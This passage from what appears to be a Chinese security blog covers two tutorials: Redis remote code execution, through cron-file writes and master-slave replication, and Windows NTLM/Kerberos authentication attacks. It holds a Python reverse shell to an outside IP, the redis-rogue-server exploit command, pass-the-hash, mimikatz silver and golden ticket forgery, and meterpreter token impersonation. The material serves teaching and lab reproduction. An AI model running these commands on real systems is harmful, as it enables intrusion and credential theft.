        <content type="html"><![CDATA[<h1 id="Redis基于主从复制的RCE利用方式"><a href="#Redis基于主从复制的RCE利用方式" class="headerlink" title="Redis基于主从复制的RCE利用方式"></a>Redis基于主从复制的RCE利用方式</h1><p>在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov在分享会上介绍了一种关于redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大，下面就让我们从以前的redis RCE利用方式出发，一起聊聊关于redis的利用问题。<br><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p><h2 id="通过写入文件GetShell"><a href="#通过写入文件GetShell" class="headerlink" title="通过写入文件GetShell"></a>通过写入文件GetShell</h2><p>未授权的redis会导致GetShell，利用方式如下：</p><pre class=" language-bash"><code class="language-bash">127.0.0.1:6379<span class="token operator">></span> config <span class="token keyword">set</span> <span class="token function">dir</span> /var/spool/cron/crontabsOK127.0.0.1:6379<span class="token operator">></span> config <span class="token keyword">set</span> dbfilename rootOK127.0.0.1:6379<span class="token operator">></span> get 1<span class="token string">"\n* * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect<span class="token variable"><span class="token punctuation">((</span>\"IP\"<span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">))</span></span>;os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"</span>127.0.0.1:6379<span class="token operator">></span> saveOK</code></pre><p>而这种方式是通过写文件来完成GetShell的，这种方式的主要问题在于，redis保存的数据并不是简单的json或者是csv，所以写入的文件都会有大量的无用数据，形似</p><pre><code>[padding]* * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"115.28.78.16\",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'[padding]</code></pre><p>这种主要利用了crontab、ssh key、webshell这样的文件都有一定容错性，再加上crontab和ssh服务可以说是服务器的标准的服务，所以在以前，这种通过写入文件的getshell方式基本就可以说是很通杀了。</p><p>但随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下，我们就需要其他的利用手段了。</p><h2 id="通过主从复制GetShell"><a href="#通过主从复制GetShell" class="headerlink" title="通过主从复制GetShell"></a>通过主从复制GetShell</h2><h3 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h3><p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><p>利用两台docker来做测试：</p><pre class=" language-bash"><code class="language-bash">docker search redis5</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190724161851.png-water_print" alt=""></p><pre><code>docker pull damonevking/redis5.0</code></pre><pre class=" language-bash"><code class="language-bash">docker <span class="token function">ps</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190724162159.png-water_print" alt=""></p><p>通过slaveof可以设置主从状态:</p><p>首先在slave上设置：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190724163007.png-water_print" alt=""></p><p>然后在master上设置：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190724162647.png-water_print" alt=""></p><p>在slave上，可以发现数据已经同步：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190724163018.png-water_print" alt=""></p><h3 id="Redis模块"><a href="#Redis模块" class="headerlink" title="Redis模块"></a>Redis模块</h3><p>在了解了主从同步之后，我们还需要对redis的模块有所了解。</p><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。</p><p>编写恶意so文件的代码<br><a href="https://github.com/RicterZ/RedisModules-ExecuteCommand" target="_blank" rel="noopener">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></p><p>git clone后，进入目录，用<code>make</code>命令编译即可获得.so库文件。</p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用模拟的恶意服务端来作为主机，并模拟fullresync请求。</p><p><a href="https://github.com/LoRexxar/redis-rogue-server" target="_blank" rel="noopener">https://github.com/LoRexxar/redis-rogue-server</a></p><p>(注：作者利用的是python3.7环境成功执行)</p><p>然后启用redis 5.0的docker</p><p>然后直接通过POC来攻击服务端</p><pre class=" language-bash"><code class="language-bash">python3 redis-rogue-server.py --rhost 172.18.0.2 --rport 6379 --lhost 172.18.0.1</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190724163504.png-water_print" alt=""></p><p>(注：在docker环境下反弹shell会出现问题，因此本文中的lhost使用的是docker宿主机的内网IP。作者在使用外网IP的时候，会弹出错误)</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190724164118.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows认证</title>
      <link href="/2019/07/07/windows-ren-zheng/"/>
      <url>/2019/07/07/windows-ren-zheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-认证"><a href="#Windows-认证" class="headerlink" title="Windows 认证"></a>Windows 认证</h1><h2 id="Windows-本地认证"><a href="#Windows-本地认证" class="headerlink" title="Windows 本地认证"></a>Windows 本地认证</h2><h3 id="本地认证基础"><a href="#本地认证基础" class="headerlink" title="本地认证基础"></a>本地认证基础</h3><p>在本地登录Windows的情况下，操作系统会使用用户输入的密码作为凭证去与系统中的密码进行验证，但是操作系统中的密码存储在哪里呢？<br>路径：<code>%SystemRoot%\system32\config\sam</code><br>当我们登录系统的时候,系统会自动地读取SAM文件中的“密码”与我们输入的“密码”进行比对，如果相同，证明认证成功!<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190707172545.png-water_print" alt=""><br>这个SAM文件中保留了计算机本地所有用户的凭证信息，可以理解为是一个数据库。</p><h3 id="NTLM-NT-LAN-Manager-Hash"><a href="#NTLM-NT-LAN-Manager-Hash" class="headerlink" title="NTLM(NT LAN Manager) Hash"></a>NTLM(NT LAN Manager) Hash</h3><p>NTLM Hash是支持Net NTLM认证协议及本地认证过程中的一个重要参与物，其长度为32位，由数字与字母组成。<br>Windows本身不存储用户的明文密码，它会将用户的明文密码经过加密算法后存储在SAM数据库中。<br>当用户登录时,将用户输入的明文密码也加密成NTLM Hash,与SAM数据库中的NTLM Hash进行比较。NTLM Hash的前身是LM Hash，目前基本淘汰，但是还是存在。</p><h4 id="NTLM-Hash——产生"><a href="#NTLM-Hash——产生" class="headerlink" title="NTLM Hash——产生"></a>NTLM Hash——产生</h4><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190707172559.png-water_print" alt=""></p><p>admin =&gt; 209c6174da490caeb422f3fa5a7ae634</p><ol><li>admin -&gt; hex(16进制编码) = 61646d69e</li><li>61646d69e -&gt; unicode = 610064006d0069006e00</li><li>610064006d0069006e00 -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634</li></ol><h4 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h4><ul><li>Windows Logon Process(即winlogon.exe是Windows NT用户登陆程序,用于管理用户登录和退出。</li><li>LSASS是微软Windows系统的安全机制。用于本地安全和登陆策略。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190707172612.png-water_print" alt=""></li></ul><h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><ul><li>将所有小写字母转换为大写字母</li><li>123ABC //未达到7个字符</li><li>将密码转化为16进，分两组，填充为14个字符，空余位使用0x00字符填补</li><li>31323341424300000000000000将密码分割为两组7个字节的块</li><li>31323341424300 000000000000 //16进制</li><li>将每组转化为比特流,不足56Bit则在左边加0</li><li>31323341424300 -&gt; (转换为二进制)<ul><li>11000100110010001100110100001010000100100001100000000-&gt;(补足56Bit)</li><li>00110001001100100011001101000001010000100100001100000000</li></ul></li><li>将比特流按照7比特一组，分出8组，末尾加0</li></ul><p>由于后者都为0，结果可想而知，那就都是0;</p><ul><li>将每组比特流转换为16进制作为被加密的值，使用DES加密，字符串 “KGS!@#$%”为Key(0x4B47532140232425)，得到8个结果 ，每个 结果转换为16进制。</li><li>-&gt; 00110000100110001000110001101000000101000001001000001100 00000000</li><li>-&gt;30988C6814120C00 -&gt; DES(30988C6814120C00) -&gt; 48-D7-EB-91- 2F-5E-69-7C</li><li>由于我们的密码不超过7字节，所以后面的一半是固定的:</li><li>AA-D3-B4-35-B5-14-04-EE</li><li>连接两个DES加密字符串。这是LM哈希。</li><li>48-D7-EB-91-2F-5E-69-7C-AA-D3-B4-35-B5-14-04-EE</li></ul><h2 id="Windows网络认证"><a href="#Windows网络认证" class="headerlink" title="Windows网络认证"></a>Windows网络认证</h2><p>在内网渗透中，经常遇到工作组环境，而工作组环境是一个逻辑上的网络环境(工作区)，隶属于工作组的机器之间无法互相建立一个完美的信任机制，只能点对点，是比较落后的认证方式，没有信托机构。</p><p>假设A主机与B主机属于同一个工作组环境，A想访问B主机上的资料，需要将一个存在于B主机上的账户凭证发送至B主机，经过认证才能够访问B主机上的资源。</p><p>这是我们接触比较多的SMB共享文件的案例，SMB的默认端口是445。</p><p>早期SMB协议在网络上传输明文口令。后来出现 LAN Manager Challenge/Response 验证机制，简称LM，它是如此简单以至很容易就被破解，现在又有了NTLM v2 以及Kerberos。</p><h3 id="Challenge-Response"><a href="#Challenge-Response" class="headerlink" title="Challenge/Response"></a>Challenge/Response</h3><p>第一步：协商</p><ul><li>客户端主要在这一步向服务器确认协议的版本，是v1还是v2。不止者一点点</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190707172620.png-water_print" alt=""></p><p>第二步：质询完整过程：</p><ol><li>客户端向服务器端发送用户信息(用户名)请求</li><li>服务器接受到请求，生成一个16位的随机数，被称之为“Challenge”， 使用登录用户名对应的NTLM Hash加密Challenge(16位随机字符)，生成Challenge1。同时，生成Challenge1后，将Challenge(16位随机字符)发送给客户端。<code>//Net NTLM Hash = NTLM Hash(Challenge)</code></li><li>客户端接受到Challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。</li></ol><p>第三步：验证</p><ul><li>服务器端收到客户端的Response后，比对Chanllenge1与Response是否相等，若相等，则认证通过。</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190707172647.png-water_print" alt=""></p><p>使用另外一种方式解读：</p><ol><li>Server接收到Client发送的用户名后，判断本地账户列表是否有用户名share_user，<ul><li>如果没有，返回认证失败；</li><li>如果有，生成Chanllenge，并且从本地查找share_user对 应的NTLM Hash，使用NTLM Hash加密Chanllenge，生成一 个Net-NTLM Hash存在内存中，并将Chanllenge发送给Client。</li></ul></li><li>Client接收到Chanllenge后，将自己提供的share_user的密码转换为NTLM Hash，使用NTLM Hash加密Chanllenge，这个结果叫Response，表现形式是Net-NTLM Hash，最后将Response发送给Server。</li><li>Server接收到Client发送的Response，将Response与之前的Net-NTLM Hash进行比较，如果相等，则认证通过。</li></ol><p><code>注意:</code></p><ol><li>Chanllenge是Server产生的一个16字节的随机数，每次认证都不同</li><li>Response的表现形式是Net-NTLM Hash，它是由客户端提供的密码Hash加密Server返回的Chanllenge产生的结果。</li></ol><h3 id="NTLM-v2"><a href="#NTLM-v2" class="headerlink" title="NTLM v2"></a>NTLM v2</h3><p>NTLM v1与NTLM v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是NTLM Hash。</p><p>下面细说一下有什么不同:<br>Challage:NTLM v1的Challenge有<code>8</code>位，NTLM v2的Challenge为<code>16</code>位<br>Net-NTLM Hash:NTLM v1的主要加密算法是<code>DES</code>，NTLM v2的主要加密算法是<code>HMAC-MD5</code>。<br>//Responder、smbexec</p><h3 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h3><p>在内网渗透中，我们经常会需要抓取管理员的密码、NTLM Hash，通过搜集这些信息有助于我们扩大战果，<code>尤其是在域环境下</code>。</p><ul><li><p>什么是哈希传递?<br>哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。</p></li><li><p>哈希传递的作用?<br>解决了我们渗透中获取不到明文密码、破解不了NTLM Hash而又想扩大战果的问题。</p></li></ul><h4 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h4><ul><li>哈希传递需要被认证的主机能够访问到服务器(废话)</li><li>哈希传递需要被传递认证的用户名</li><li>哈希传递需要被传递认证用户的NTLM Hash</li></ul><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>要完成一个NTLM认证，第一步需要客户端将自己要参与认证的 用户名发送至服务器端，等待服务器端给出的Challenge⋯⋯<br><img src="media/15624654066677/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-07-07%20%E4%B8%8A%E5%8D%8811.18.54.png" alt="屏幕快照 2019-07-07 上午11.18.54"><br>其实哈希传递就是使用用户名对应的NTLM Hash将服务器给出的Chanllenge加密，生成一个Response，来完成认证。<br>Pass The Hash能够完成一个不需要输入密码的NTLM协议认证流程，所以不算是一个漏洞，算是一个技巧。</p><p>Pass The Hash的工具：<br>Smbmap<br>CrackMapExec<br>Smbexec<br>Metasploit<br>使用CrackMapExec实现Hash传递：</p><pre class=" language-bash"><code class="language-bash">root@kali:~/cache<span class="token comment" spellcheck="true"># cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami</span>SMB 192.168.3.5 445 LIYINGZHEA30B<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows 7 Ultimate 7601 Service Pack 1 x64 <span class="token punctuation">(</span>name:LIYINGZHEA30B<span class="token punctuation">)</span><span class="token punctuation">(</span>domain:PAYLOADS<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:True<span class="token punctuation">)</span>SMB 192.168.3.5 445 LIYINGZHEA30B<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9<span class="token punctuation">(</span>Pwn3d<span class="token operator">!</span><span class="token punctuation">)</span>SMB 192.168.3.5 445 LIYINGZHEA30B <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Executed <span class="token function">command</span></code></pre><h2 id="Kerberos域认证"><a href="#Kerberos域认证" class="headerlink" title="Kerberos域认证"></a>Kerberos域认证</h2><h3 id="Active-Directory-活动目录-的概念"><a href="#Active-Directory-活动目录-的概念" class="headerlink" title="Active Directory(活动目录)的概念"></a>Active Directory(活动目录)的概念</h3><p>Windows提供了为企业管理资产、服务、网络对象进行组织化的管理，这非常符合企业架构的管理模式。而承载这些管理机制的就是活动目录服务。如果要搭建一个域，就需要安装活动目录服务。</p><p>活动目录服务以域名来划分域的边界，域外就不属于管理范围了，也就是说，一个域对应一个域名，域之间也可以相互信任。</p><p>Active Directory存储了有关<code>网络对象</code>的信息，并且让管理员和用户能够轻松地查找和使用这些信息。Active Directory使用了一种 结构化的数据存储方式，并以此作为基础对目录信息进行合乎<code>逻辑的分层组织</code>。</p><p><code>网络对象分为</code>:用户、用户组、计算机、域、组织单位以及安全策略等。</p><h3 id="Active-Directory-活动目录-的概念-1"><a href="#Active-Directory-活动目录-的概念-1" class="headerlink" title="Active Directory(活动目录)的概念"></a>Active Directory(活动目录)的概念</h3><ul><li><code>服务器及客户端计算机管理</code>:管理服务器及客户端计算机账户， 所有服务器及客户端计算机加入域管理并实施组策略。</li><li><code>用户服务</code>:管理用户域账户、用户信息、企业通讯录(与电子邮件系统集成)、用户组管理、用户身份认证、用户授权管理等，按省实施组管理策略。</li><li><code>资源管理</code>:管理打印机、文件共享服务等网络资源。</li><li><code>桌面配置</code>:系统管理员可以集中的配置各种桌面配置策略，如: 用户使用域中资源权限限制、界面功能的限制、应用程序执行特征限制、网络连接限制、安全配置限制等。</li><li><code>应用系统支撑</code>:支持财务、人事、电子邮件、企业信息门户、办公自动化、补丁管理、防病毒系统等各种应用系统。</li></ul><p>在域中，网络对象可以相互访问，但是在真实情况中，需要对某些部门的计算机进行限制，例如：销售部门不能访问技术部门的服务器。</p><p>这个中间就需要Kerberos认证协议来验证网络对象间的权限。</p><h3 id="域认证体系-Kerberoes"><a href="#域认证体系-Kerberoes" class="headerlink" title="域认证体系 - Kerberoes"></a>域认证体系 - Kerberoes</h3><p><code>Kerberos 是一种网络认证协议</code>，其设计目标是通过<code>密钥系统</code>为客户机/服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，<code>并假定网络上传送的数据包可以被任意地读取、修改和插入数据</code>。在以上情况下，Kerberos作为一种可信任的第三方认证服务，是通过传统的密码技术(如:共享密钥)执行认证服务的。</p><h3 id="域认证所参与的角色"><a href="#域认证所参与的角色" class="headerlink" title="域认证所参与的角色"></a>域认证所参与的角色</h3><p>Kerberos的标志是三只狗头，狗头分别代表以下角色：</p><ul><li>Client</li><li>Server</li><li>KDC(Key Distribution Center) = DC(Domain Controller)</li></ul><h3 id="域认证所参与的角色-1"><a href="#域认证所参与的角色-1" class="headerlink" title="域认证所参与的角色"></a>域认证所参与的角色</h3><ul><li>AD(Account database):存储所有client的白名单，只有存在于白名单的client才能<code>顺利申请到TGT</code></li><li>Authentication Service:为client生成TGT的服务</li><li>Ticket Granting Service:<code>为client生成某个服务的ticket</code></li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190707172747.png-water_print" alt=""><br>从物理层面看，AD与KDC均为域控制器(Domain Controller)。</p><h3 id="域认证粗略流程"><a href="#域认证粗略流程" class="headerlink" title="域认证粗略流程"></a>域认证粗略流程</h3><ol><li>client向kerberos服务请求，希望获取访问server的权限。 kerberos得到了这个消息，首先得判断client是否是可信赖的，也就是白名单黑名单的说法。这就是AS服务完成的工作，通过在AD中存储黑名单和白名单来区分client。成功后，返回AS返回TGT给client。</li><li>client得到了TGT后，继续向kerberos请求，希望获取访问server的权限。kerberos又得到了这个消息，这时候通过client消息中的TGT，判断出了client拥有了这个权限，给了client访问server的权限ticket。</li><li>client得到ticket后，终于可以成功访问server。这个ticket只是针对这个server，其他server需要向TGS申请。</li></ol><h4 id="第一步-Session-Key-与-Ticket-Granting-Ticket"><a href="#第一步-Session-Key-与-Ticket-Granting-Ticket" class="headerlink" title="第一步 Session Key 与 Ticket Granting Ticket"></a>第一步 Session Key 与 Ticket Granting Ticket</h4><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190707172851.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190707172902.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190707172911.png-water_print" alt=""></p><h4 id="第二步-Session-Key-与-Ticket-Granting-Ticket"><a href="#第二步-Session-Key-与-Ticket-Granting-Ticket" class="headerlink" title="第二步 Session Key 与 Ticket Granting Ticket"></a>第二步 Session Key 与 Ticket Granting Ticket</h4><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190707172918.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190707172930.png-water_print" alt=""></p><h4 id="第三步-Server-Session-Key-与-Ticket"><a href="#第三步-Server-Session-Key-与-Ticket" class="headerlink" title="第三步 Server Session Key 与 Ticket"></a>第三步 Server Session Key 与 Ticket</h4><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190707172938.png-water_print" alt=""></p><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据的特点：</p><ol><li>不需要与KDC进行交互</li><li>需要目标服务的NTLM Hash</li></ol><p>在第三步认证中的Ticket的组成：<br><code>Ticket = Server Hash(Server Session Key + Client info + End Time)</code></p><p>当拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。</p><p>PS:Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。 所以，一切凭据都来源于Server Hash。</p><h3 id="伪造白银票据"><a href="#伪造白银票据" class="headerlink" title="伪造白银票据"></a>伪造白银票据</h3><p>首先需要导出Server Hash：</p><pre><code>C:\files&gt;mimikatz.exe "privilege::debug” "sekurlsa::logonpasswords" "exit" &gt; log.txt</code></pre><p>伪造票据:</p><pre><code>mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt" exit</code></pre><p>Other：</p><ul><li>kerberos::list #列出票据</li><li>kerberos::purge # 清除票据</li></ul><p>由于白银票据需要目标服务器的Hash，所以没办法生成对应域内所有服务器的票据，也不能通过TGT申请。因此只能针对服务器上的某些服务去伪造，伪造的服务类型列表如下:</p><table><thead><tr><th align="center">服务注释</th><th align="center">服务名</th></tr></thead><tbody><tr><td align="center">WMI</td><td align="center">HOST、RPCSS</td></tr><tr><td align="center">Powershell Remoteing</td><td align="center">HOST、HTTP</td></tr><tr><td align="center">WinRM</td><td align="center">HOST、HTTP</td></tr><tr><td align="center">Scheduled Tasks</td><td align="center">HOST</td></tr><tr><td align="center">LDAP 、DCSync</td><td align="center">LDAP</td></tr><tr><td align="center">Windows File Share (CIFS)</td><td align="center">CIFS</td></tr><tr><td align="center">Windows Remote ServerAdministration Tools</td><td align="center">RPCSS、LDAP、CIFS</td></tr></tbody></table><h3 id="白银票据-Silver-Tickets-防御"><a href="#白银票据-Silver-Tickets-防御" class="headerlink" title="白银票据(Silver Tickets)防御"></a>白银票据(Silver Tickets)防御</h3><ol><li>尽量保证服务器凭证不被窃取</li><li>开启PAC (Privileged Attribute Certificate) 特权属性证书保护 功能，PAC主要是规定服务器将票据发送给kerberos服务，由kerberos服务验证票据是否有效。<br>开启方式:<br>将注册表中<code>HKEY_LOCAL_MACHINE\SYSTEM \ CurrentControlSet\Control\Lsa\Kerberos\Parameters</code>中的<code>ValidateKdcPacSignature</code>设置为1</li></ol><h3 id="黄金票据-Golden-Tickets"><a href="#黄金票据-Golden-Tickets" class="headerlink" title="黄金票据(Golden Tickets)"></a>黄金票据(Golden Tickets)</h3><p>黄金票据特点:</p><ol><li>需要与DC通信</li><li>需要krbtgt用户的hash<br>PS:这里的krbtgt hash就是之前讲的KDC Hash<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190707172958.png-water_print" alt=""></li></ol><p><code>注意</code>:这里的krbtgt hash就是之前讲的KDC Hash</p><h3 id="黄金票据-Golden-Tickets-MSF-kiwi"><a href="#黄金票据-Golden-Tickets-MSF-kiwi" class="headerlink" title="黄金票据(Golden Tickets)-MSF kiwi"></a>黄金票据(Golden Tickets)-MSF kiwi</h3><p>使用meterpreter中的kiwi模块： <code>load kiwi</code><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190707173017.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190707173026.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190707173033.png-water_print" alt=""></p><h3 id="黄金票据-Golden-Tickets-伪造"><a href="#黄金票据-Golden-Tickets-伪造" class="headerlink" title="黄金票据(Golden Tickets) - 伪造"></a>黄金票据(Golden Tickets) - 伪造</h3><p>伪造票据:</p><pre><code>mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt" exit</code></pre><h3 id="Tickets-总结"><a href="#Tickets-总结" class="headerlink" title="Tickets 总结"></a>Tickets 总结</h3><ul><li>黄金票据:从攻击面来看，获取krbtgt用户的hash后，可以在域中 进行持久性的隐藏，并且日志无法溯源，但是需要拿到DC权限， 使用黄金票据能够在一个域环境中长时间控制整个域。</li><li>从防御角度来看，需要经常更新krbtgt的密码，才能够使得原有的 票据失效。最根本的办法是不允许域管账户登录其他服务器。</li><li>白银票据:从攻击面来看，伪造白银票据的难度比伪造黄金票据的 难度较小，因为一个域中的服务器如果对外的话，非常容易被入侵， 并且容易被转储Server。</li><li>从防御角度来看，需要开启PAC认证，但这会降低认证效率，增加 DC的负担，最根本的还是要加固服务器本身对外的服务。</li></ul><h2 id="Windows-Access-Token"><a href="#Windows-Access-Token" class="headerlink" title="Windows Access Token"></a>Windows Access Token</h2><h3 id="Windows-Access-Token简介"><a href="#Windows-Access-Token简介" class="headerlink" title="Windows Access Token简介"></a>Windows Access Token简介</h3><p>Windows Token其实叫Access Token(访问令牌)，它是一个描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后，都会生成一个Access Token，这个Token在用户创建进程或者线程 时会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该进程没有B用户的权限。</p><p>Access Token种类：</p><ul><li>主令牌</li><li>模拟令牌</li></ul><p>一般情况下，用户双击运行一个程序，都会拷贝“explorer.exe”的Access Token。<br>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。</p><h3 id="Access-Token的组成"><a href="#Access-Token的组成" class="headerlink" title="Access Token的组成"></a>Access Token的组成</h3><ul><li>用户帐户的安全标识符(SID)</li><li>用户所属的组的SID</li><li>用于标识当前登录会话的登录SID</li><li>用户或用户组所拥有的权限列表</li><li>所有者SID</li><li>主要组的SID</li><li>访问控制列表</li><li>访问令牌的来源</li><li>令牌是主要令牌还是模拟令牌</li><li>限制SID的可选列表</li><li>目前的模拟等级</li><li>其他统计数据</li></ul><h3 id="Windows-Access-Token-–-SID-Security-Identifiers-安全标识符"><a href="#Windows-Access-Token-–-SID-Security-Identifiers-安全标识符" class="headerlink" title="Windows Access Token – SID (Security Identifiers)安全标识符"></a>Windows Access Token – SID (Security Identifiers)安全标识符</h3><p>安全标识符是一个唯一的字符串，它可以代表一个账户、一个用户 组、或者是一次登录。通常它还有一个SID固定列表，例如 Everyone这种已经内置的账户，默认拥有固定的SID。</p><p>SID的表现形式:</p><ul><li>域SID-用户ID</li><li>计算机SID-用户ID</li><li>SID列表都会存储在域控的AD或者计算机本地账户数据库中。</li></ul><h3 id="Windows-Access-Token产生过程"><a href="#Windows-Access-Token产生过程" class="headerlink" title="Windows Access Token产生过程"></a>Windows Access Token产生过程</h3><p>每个进程创建时都会根据登录会话权限由LSA(Local Security Authority)分配一个Token(如果CreaetProcess时自己指定了 Token, LSA会用该Token， 否则就用父进程Token的一份拷贝。</p><h3 id="Windows-Access-Token令牌假冒实战"><a href="#Windows-Access-Token令牌假冒实战" class="headerlink" title="Windows Access Token令牌假冒实战"></a>Windows Access Token令牌假冒实战</h3><p><code>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。</code><br>可以使用多种工具查看目前系统上存在的模拟令牌:</p><ul><li>Incognito</li><li>Powershell - Invoke-TokenManipulation.ps1</li><li>Cobalt Strike - steal_token</li></ul><p>案例(针对某跨国企业的一次渗透测试 获取DC权限）:<br><a href="http://blog.360ec.net/archives/32/" target="_blank" rel="noopener">http://blog.360ec.net/archives/32/</a></p><pre><code>meterpreter &gt; getsystemmeterpreter &gt; load incognito meterpreter &gt; list_tokens –uDelegation Tokens Available ============================== NT AUTHORITY\LOCAL SERVICENT AUTHORITY\NETWORK SERVICENT AUTHORITY\SYSTEM PAYLOADS\Administrator PAYLOADS\w7meterpreter &gt; impersonate_token "PAYLOADS\\Administrator”[+] Delegation token available[+] Successfully impersonated user PAYLOADS\Administrator</code></pre><h3 id="Windows-Access-Token令牌假冒防御"><a href="#Windows-Access-Token令牌假冒防御" class="headerlink" title="Windows Access Token令牌假冒防御"></a>Windows Access Token令牌假冒防御</h3><p>禁止Domain 